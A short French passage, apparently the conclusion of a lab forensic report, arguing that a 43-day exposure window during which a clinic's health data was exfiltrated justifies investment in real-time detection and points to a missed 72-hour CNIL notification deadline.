+**Les 43 jours comme argument d'architecture.** La fenêtre d'exposition de 43 jours est un chiffre que tout RSSI comprend sans explication. Un rapport forensique qui produit ce chiffre, avec les preuves à l'appui, est un document de gouvernance autant qu'un document technique. C'est l'argument le plus convaincant pour justifier un investissement dans la détection en temps réel, la corrélation d'alertes, et la couverture de journalisation. Les données de santé de la Clinique St-Jean ont été exfiltrées pendant cette fenêtre - la probabilité d'une notification CNIL sous 72h aurait dû s'appliquer dès le 07 mars 2026, non le 19 avril.
+
+---
+*Fin du rapport de Lab.*
